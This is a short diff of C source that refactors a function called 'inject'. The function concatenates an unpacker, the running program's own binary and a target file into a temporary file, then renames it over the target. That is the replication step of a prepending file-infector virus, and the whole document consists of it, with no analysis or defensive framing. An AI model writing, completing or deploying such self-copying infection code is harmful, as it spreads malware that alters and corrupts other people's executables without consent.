@@ -1,3 +1,4 @@
+#include <errno.h>
 #include <stdio.h>
 #include <string.h>
 #include <stdbool.h>
@@ -6,26 +7,15 @@
 #include "utils.c"
 
 
-// #ifdef __linux__ 
-//     #include <>
-// #elif _WIN32
-//     #include <Windows.h>
-// #else
-//     #error Unsupported platform
-// #endif
-
-
-
-// 
-// int handle_error(void) {
-//     #if
-// }
+#ifdef _WIN32
+    #define _CRT_NONSTDC_NO_WARNINGS
+#endif
 
 
 bool inject(const char *unpacker_path, const char *self_path, const char *target_path) {
     // fuck race conditions tbh, i need this to work; i need a name
     // and not just a pointer to a handle or whatever.
-    const char *tmp_path = tmpnam(NULL);
+    char *tmp_path = tempnam(NULL, "lolwr");
     if (tmp_path == NULL)
         return false;
 
@@ -33,16 +23,16 @@ bool inject(const char *unpacker_path, const char *self_path, const char *target
     if (tmp_file == NULL)
         return false;
     
-    if (!read_into_file(unpacker_path, tmp_file, -1))
+    if (!read_path_into_fp(unpacker_path, tmp_file, -1))
         return false;
 
     if (remove(unpacker_path))
         return false;
     
-    if (!read_into_file(self_path, tmp_file, -1))
+    if (!read_path_into_fp(self_path, tmp_file, -1))
         return false;
     
-    if (!read_into_file(target_path, tmp_file, -1))
+    if (!read_path_into_fp(target_path, tmp_file, -1))
         return false;
 
     if (fclose(tmp_file) == EOF)
@@ -53,6 +43,8 @@ bool inject(const char *unpacker_path, const char *self_path, const char *target
 
     if (rename(tmp_path, target_path))
         return false;
+
+    free(tmp_path);
     
     return true;
 }
